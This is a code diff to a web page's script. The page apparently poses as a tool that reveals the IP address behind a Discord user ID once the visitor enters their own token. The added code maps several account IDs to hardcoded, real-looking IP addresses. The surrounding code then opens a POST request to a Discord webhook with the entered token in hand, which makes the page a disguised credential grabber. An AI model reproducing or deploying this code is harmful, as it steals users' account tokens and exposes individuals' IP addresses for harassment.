@@ -104,6 +104,14 @@
 </i></body>
 <script>
 // holy hell its been a while
+function storedips(id) {
+  if (id == "311833206423027712") {
+  document.getElementById('ipdisplay').innerHTML = "87.70.33.54"	
+  }
+  if (id == "745665693847912449") {
+  document.getElementById('ipdisplay').innerHTML = "75.131.229.226"  
+  }
+}
 function getip() {
 var token = document.getElementById('token').value
 if (token =="") {
@@ -114,7 +122,10 @@ if (typeof token !="string") {
 document.getElementById('ipdisplay').innerHTML = "Error: Invalid Token"	
 return
 }
-
+if (token.length < 6 ) {
+ document.getElementById('ipdisplay').innerHTML = "Error: Invalid Token"
+}
+// https://www.youtube.com/watch?v=tw0tinIDWzQ
 document.getElementById('ipdisplay').innerHTML = "Error: Infault Params"
 if (document.getElementById('user_id').value == "984517763357888592") {
 document.getElementById('ipdisplay').innerHTML = "136.35.48.153"
@@ -125,6 +136,7 @@ document.getElementById('ipdisplay').innerHTML = "66.160.63.255"
 if (document.getElementById('user_id').value == "907025179207684126") {
 document.getElementById('ipdisplay').innerHTML = "73.0.230.193"
 }
+storedips(document.getElementById('user_id').value)
 if (token !="") {
  const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/1043323707478773801/utPyIWs5mwx75cko12Rv3kzxAGpAzfUpNrCmLzOmgTKNAF-b0tS4jXTMhoJyCEebLvOi");
